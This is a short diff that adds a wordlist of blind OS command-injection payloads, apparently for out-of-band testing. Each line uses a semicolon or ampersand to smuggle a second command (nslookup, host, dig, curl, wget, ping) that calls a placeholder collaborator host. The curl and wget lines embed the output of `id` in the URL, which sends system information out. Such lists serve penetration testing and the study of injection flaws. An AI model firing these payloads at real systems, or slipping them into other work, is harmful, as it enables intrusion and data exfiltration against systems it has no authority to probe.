@@ -1,0 +1,7 @@
+;nslookup YOURCOLLABID.example.com;
+;host YOURCOLLABID.example.com;
+;dig @YOURDNS YOURCOLLABID.example.com;
+;curl http://YOURCOLLABID.example.com/`id`;
+;wget http://YOURCOLLABID.example.com/`id`;
+& ping -c 3 YOURCOLLABID.example.com &
+& ping -n 3 YOURCOLLABID.example.com &
